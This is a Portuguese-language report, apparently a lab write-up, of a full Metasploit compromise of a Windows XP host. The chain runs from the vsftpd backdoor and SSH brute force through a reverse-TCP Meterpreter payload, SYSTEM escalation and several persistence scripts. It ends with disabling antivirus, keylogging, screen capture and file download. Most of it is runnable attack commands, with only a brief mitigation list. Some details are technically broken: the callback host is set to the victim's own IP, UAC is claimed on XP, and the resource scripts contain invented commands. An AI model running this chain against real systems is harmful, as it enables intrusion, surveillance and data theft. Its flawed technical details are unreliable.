# Relatório: Escalonamento de Privilégios no Windows XP via Reverse TCP

## 📋 Resumo Executivo
Este relatório documenta a simulação completa de um ataque de escalonamento de privilégios em um sistema Windows XP, partindo de uma vulnerabilidade no serviço FTP até obter controle administrativo completo e estabelecer persistência automatizada através de conexão reverse TCP.

## 🔍 Fase 1: Exploração Inicial e Acesso

### 1.1 Exploração do Backdoor vsftpd 2.3.4
```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set rhosts 192.168.56.101
set payload cmd/unix/interact
exploit
```
**Resultado**: Acesso ao sistema Metasploitable obtido através da vulnerabilidade conhecida no vsftpd.

### 1.2 Reconhecimento da Rede Interna
A partir do acesso no Metasploitable, identificamos o Windows XP no IP `192.168.56.102` através de escaneamento interno da rede.

## 💻 Fase 2: Ataque ao Windows XP

### 2.1 Teste de Vulnerabilidade RDP
```bash
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
set rhost 192.168.56.102
run
```
**Observação**: Teste de negação de serviço no RDP para validar a vulnerabilidade do sistema.

### 2.2 Força Bruta via SSH
```bash
use auxiliary/scanner/ssh/ssh_login
set rhosts 192.168.56.102
set USER_FILE /home/kali/user.txt
set PASS_FILE /home/kali/password.txt
exploit
```
**Credenciais Obtidas**: 
- Usuário: `user` 
- Senha: `password`

### 2.3 Estabelecimento de Sessão
```bash
sessions
sessions 1
```
**Status**: Sessão SSH estabelecida com privilégios limitados no Windows XP.

## 🎯 Fase 3: Exploração e Escalonamento

### 3.1 Criação do Payload Malicioso
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 platform windows -f exe LHOST=192.168.56.102 LPORT=4444 -o update.exe
cp update.exe /var/www/html
service apache2 start
```
**Payload**: Meterpreter reverse TCP configurado para conexão com o atacante.

### 3.2 Automação do Handler com Resource Script
```bash
# Criando arquivo de automação meterpreter.rc
nano meterpreter.rc
```
**Conteúdo do arquivo meterpreter.rc:**
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.56.102
set lport 4444
exploit -z
```

**Execução automatizada:**
```bash
# Executando o handler automaticamente
msfconsole -r meterpreter.rc

# Alternativa: carregar script dentro do msfconsole
resource meterpreter.rc
```
**Vantagens da Automação:**
- Configuração rápida e reproduzível
- Padronização de parâmetros
- Facilidade em testes repetitivos
- Documentação incorporada do processo

### 3.3 Escalonamento Inicial de Privilégios
```bash
sysinfo
getsystem
getuid
```
**Resultado**: 
- Sistema: Windows XP Professional
- Usuário Atual: `NT AUTHORITY\SYSTEM`
- UID: `S-1-5-18`

### 3.4 Migração de Processo
```bash
ps
migrate 1424
getpid
```
**Processo Alvo**: Migração para processo com PID 1424 (svchost.exe) para maior estabilidade.

## 🔓 Fase 4: Controle Total do Sistema

### 4.1 Acesso a Shell do Sistema
```bash
shell
whoami
whoami /priv
```
**Privilégios Obtidos**:
- SE_DEBUG_PRIVILEGE
- SE_IMPERSONATE_PRIVILEGE  
- SE_TAKE_OWNERSHIP_PRIVILEGE

### 4.2 Bypass de UAC (User Account Control)
```bash
use exploit/windows/local/bypassuac
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.56.102
set LPORT 2022
exploit
```
**Resultado**: Contorno bem-sucedido das restrições do UAC.

## 🔄 Fase 5: Automação de Persistência com Privilégios

### 5.1 Script de Automação Completa com Persistência
```bash
# Criando script completo de exploração e persistência
nano full_automation.rc
```

**Conteúdo do arquivo full_automation.rc:**
```bash
# Configuração inicial do handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.56.102
set lport 4444
set ExitOnSession false
exploit -j -z

# Aguardar sessão e executar comandos automatizados
wait_for_session

# Escalonamento de privilégios
sessions -c "getsystem"
sessions -c "getuid"

# Verificar privilégios antes da persistência
sessions -c "shell whoami /priv"

# Persistência via serviço (requer privilégios administrativos)
use exploit/windows/local/persistence_service
set lhost 192.168.56.102
set lport 2022
set session 1
set startup SYSTEM
set service_name "WindowsUpdateService"
set retry_time 30
exploit -j

# Persistência alternativa via registry
use exploit/windows/local/registry_persistence  
set lhost 192.168.56.102
set lport 2023
set session 1
set startup USER
set reg_name "SystemConfig"
exploit -j
```

### 5.2 Script de Persistência com Verificação de Privilégios
```bash
nano persistence_automated.rc
```

**Conteúdo do persistence_automated.rc:**
```bash
# Verificar se temos privilégios suficientes
sessions -c "getuid"
sessions -c "getprivs"

# Tentar persistência como serviço (máximo privilégio)
use exploit/windows/local/persistence_service
set lhost 192.168.56.102
set lport 2022
set session 1
set startup SYSTEM
set service_name "WinUpdate"
set local_exe true
exploit

# Se falhar, tentar métodos alternativos com menos privilégios
use exploit/windows/local/registry_persistence
set lhost 192.168.56.102  
set lport 2023
set session 1
set startup USER
set reg_name "ConfigUpdate"
exploit

# Persistência via agendador de tarefas
use exploit/windows/local/scheduled_task
set lhost 192.168.56.102
set lport 2024
set session 1
set taskname "SystemMaintenance"
exploit
```

### 5.3 Execução da Automação Completa
```bash
# Executar automação completa
msfconsole -r full_automation.rc

# Ou executar partes específicas
resource persistence_automated.rc
```

## 📊 Fase 6: Pós-Exploração e Coleta de Dados

### 6.1 Desabilitação de Antivírus
```bash
run post/windows/manage/killav
```
**Ação**: Remoção de possíveis soluções de segurança.

### 6.2 Monitoramento e Captura de Dados
```bash
run vnc
screenshare
keyscan_start
keyscan_dump
keyscan_stop
```
**Dados Capturados**: 
- Acesso visual remoto via VNC
- Log de teclas digitadas pelo usuário
- Captura de tela em tempo real

### 6.3 Busca e Exfiltração de Dados
```bash
search -f *.txt
download "c:\Documents and Settings\Administrador\Meus documentos\test_download.txt"
upload users.txt "c:\Documents and Settings\Administrador\Meus documentos"
```
**Arquivos Encontrados**: Documentos de texto contendo informações sensíveis dos usuários.

### 6.4 Módulos de Pós-Exploração Automatizados
```bash
# Script automatizado de coleta de dados
nano data_collection.rc

# Conteúdo:
use post/windows/gather/enum_shares
set session 1
run

use post/windows/gather/enum_applications  
set session 1
run

use post/multi/recon/local_exploit_suggester
set session 1
run

use post/windows/gather/arp_scanner
set session 1
set RHOSTS 192.168.56.1/24
run
```

## 🚀 Automação Avançada: Pipeline Completo

### Script Master de Automação
```bash
nano master_automation.rc
```

**Conteúdo do master_automation.rc:**
```bash
# === FASE 1: ESTABELECER CONEXÃO ===
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.56.102
set lport 4444
set ExitOnSession false
exploit -j -z

# === FASE 2: ESCALONAR PRIVILÉGIOS ===
wait_for_session 60
if [sessions -l | grep -q "meterpreter"]
then
    sessions -c "getsystem"
    sessions -c "run post/multi/recon/local_exploit_suggester"
end

# === FASE 3: ESTABELECER PERSISTÊNCIA ===
use exploit/windows/local/persistence_service
set lhost 192.168.56.102
set lport 2022
set session 1
set startup SYSTEM
exploit -j

# === FASE 4: COLETA DE DADOS ===
sessions -c "run post/windows/gather/enum_applications"
sessions -c "run post/windows/gather/enum_shares"
sessions -c "run post/windows/gather/checkvm"

# === FASE 5: LIMPEZA E OFUSCAÇÃO ===
sessions -c "run post/windows/manage/migrate"
sessions -c "timestomp -v"
```

## ✅ Verificação da Persistência

### Comandos de Validação:
```bash
# Verificar serviços criados
sessions -c "shell sc query | findstr WinUpdate"

# Verificar registro
sessions -c "shell reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"

# Testar reinicialização
sessions -c "reboot"

# Aguardar reconexão automática
wait_for_session 120
```

## 🛡️ Análise de Impacto

### Vulnerabilidades Exploradas:
1. **vsftpd 2.3.4 Backdoor** - Acesso inicial ao sistema
2. **Credenciais Fracas SSH** - Acesso ao Windows XP
3. **Falta de Antivírus** - Execução de payload sem detecção
4. **UAC Ineficaz** - Escalonamento de privilégios bem-sucedido

### Privilégios e Capacidades Obtidos:
- ✅ Acesso ao sistema como usuário comum
- ✅ Escalonamento para SYSTEM
- ✅ Controle administrativo completo
- ✅ Capacidade de desabilitar segurança
- ✅ Acesso a dados sensíveis
- ✅ **Persistência automatizada via serviço Windows**
- ✅ **Reconexão automática após reinicialização**
- ✅ **Automação completa do ciclo de vida do ataque**

## 💡 Recomendações de Mitigação

1. **Atualização de Software**: Atualizar vsftpd para versão sem backdoor
2. **Políticas de Senha**: Implementar senhas complexas para serviços
3. **Antivírus**: Instalar e manter solução de segurança atualizada
4. **Controle de Privilégios**: Configurar UAC corretamente
5. **Monitoramento de Serviços**: Auditar serviços não autorizados
6. **Segmentação de Rede**: Isolar sistemas legados em redes separadas
7. **Logs e Auditoria**: Manter logs detalhados de autenticação e acesso
8. **Monitoramento de Registry**: Detectar alterações suspeitas no registro

---

**⚠️ Nota de Segurança**: Este relatório documenta atividades realizadas exclusivamente em ambiente controlado para fins educacionais de segurança ofensiva. 